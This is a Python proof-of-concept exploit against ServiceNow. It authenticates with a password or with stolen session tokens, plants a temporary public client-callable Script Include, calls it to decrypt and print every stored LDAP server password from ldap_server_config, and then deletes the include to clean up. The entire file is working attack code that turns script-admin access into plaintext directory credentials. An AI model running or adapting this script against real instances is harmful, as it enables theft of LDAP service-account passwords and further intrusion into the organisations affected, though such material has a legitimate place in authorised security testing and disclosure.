#!/usr/bin/env python3
# /// script
# requires-python = ">=3.9"
# dependencies = [
#   "requests>=2.32.5",
# ]
# ///
"""POC: retrieve ldap_server_config passwords through a temporary Script Include.

Requires a ServiceNow identity that can create and execute Global client-callable
Script Includes (direct script_include_admin is sufficient).
"""

import argparse
import getpass
import html
import json
import re
import secrets
import sys

import requests


SYS_ID = re.compile(r"^[0-9a-f]{32}$", re.IGNORECASE)


def extract_g_ck(body):
    for pattern in (
        r"var\s+g_ck\s*=\s*['\"]([^'\"]+)['\"]",
        r"g_ck\s*=\s*['\"]([^'\"]+)['\"]",
    ):
        match = re.search(pattern, body)
        if match:
            return match.group(1)
    return None


def login(session, instance, username, password, timeout):
    response = session.post(
        instance + "/login.do",
        data={
            "user_name": username,
            "user_password": password,
            "sys_action": "sysverb_login",
        },
        allow_redirects=True,
        timeout=timeout,
    )
    response.raise_for_status()
    if "login.do" in response.url:
        raise RuntimeError("login failed or an MFA challenge was returned")

    token = extract_g_ck(response.text)
    if not token:
        nav = session.get(instance + "/navpage.do", timeout=timeout)
        nav.raise_for_status()
        token = extract_g_ck(nav.text)
    if not token or not session.cookies.get("JSESSIONID"):
        raise RuntimeError("login succeeded but JSESSIONID/g_ck was not recovered")
    session.headers["X-UserToken"] = token
    return token


def processor_script(class_name):
    return f'''var {class_name}=Class.create();
{class_name}.prototype=Object.extendsObject(AbstractAjaxProcessor,{{
ajaxFunction_dump:function(){{
var s=this.getParameter("sysparm_ids"),ids=s?s.split(","):[],a=[],g=new GlideRecord("ldap_server_config");
if(ids.length)g.addQuery("sys_id","IN",ids.join(","));
g.query();
while(g.next()){{
var r=g.getValue("password");
if(JSUtil.nil(r))continue;
a.push({{sys_id:g.getUniqueValue(),name:g.getValue("name"),dn:g.getValue("dn"),password:String(g.password.getDecryptedValue())}});
}}
return JSON.stringify(a);
}},type:"{class_name}"
}});'''


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("-i", "--instance", required=True)
    parser.add_argument("-u", "--username")
    parser.add_argument("-p", "--password", help="prompt if omitted")
    parser.add_argument("--jsessionid")
    parser.add_argument("--g-ck")
    parser.add_argument("-s", "--sys-id", action="append", default=[])
    parser.add_argument("--timeout", type=int, default=20)
    parser.add_argument("--insecure", action="store_true")
    args = parser.parse_args()

    if bool(args.jsessionid) != bool(args.g_ck):
        parser.error("--jsessionid and --g-ck must be supplied together")
    if args.jsessionid and (args.username or args.password):
        parser.error("use session tokens or username/password, not both")
    if not args.jsessionid and not args.username:
        parser.error("--username or --jsessionid/--g-ck is required")
    if any(not SYS_ID.fullmatch(value) for value in args.sys_id):
        parser.error("each --sys-id must be a 32-character hexadecimal sys_id")

    instance = args.instance.rstrip("/")
    session = requests.Session()
    session.verify = not args.insecure

    if args.jsessionid:
        session.cookies.set("JSESSIONID", args.jsessionid)
        session.headers["X-UserToken"] = args.g_ck
        token = args.g_ck
    else:
        password = args.password or getpass.getpass("Password: ")
        token = login(session, instance, args.username, password, args.timeout)

    name = "SNHLdapPassword" + secrets.token_hex(4)
    include_id = None
    try:
        created = session.post(
            instance + "/api/now/table/sys_script_include",
            json={
                "name": name,
                "api_name": "global." + name,
                "active": True,
                "client_callable": True,
                "access": "public",
                "script": processor_script(name),
            },
            timeout=args.timeout,
        )
        created.raise_for_status()
        include_id = created.json()["result"]["sys_id"]
        print("[+] temporary Script Include: " + include_id, file=sys.stderr)

        result = session.post(
            instance + "/xmlhttp.do",
            data={
                "sysparm_processor": name,
                "sysparm_scope": "global",
                "sysparm_name": "dump",
                "sysparm_ids": ",".join(args.sys_id),
                "sysparm_ck": token,
            },
            timeout=args.timeout,
        )
        result.raise_for_status()
        match = re.search(r'answer="(.*?)"', result.text, re.DOTALL)
        if not match:
            raise RuntimeError("XMLHTTP response contained no answer")
        credentials = json.loads(html.unescape(match.group(1)))
        print(json.dumps(credentials, indent=2))
    finally:
        if include_id:
            cleanup = session.delete(
                instance + "/api/now/table/sys_script_include/" + include_id,
                timeout=args.timeout,
            )
            if cleanup.status_code != 204:
                print(
                    "[-] cleanup failed for Script Include " + include_id,
                    file=sys.stderr,
                )
            else:
                print("[+] temporary Script Include deleted", file=sys.stderr)


if __name__ == "__main__":
    main()
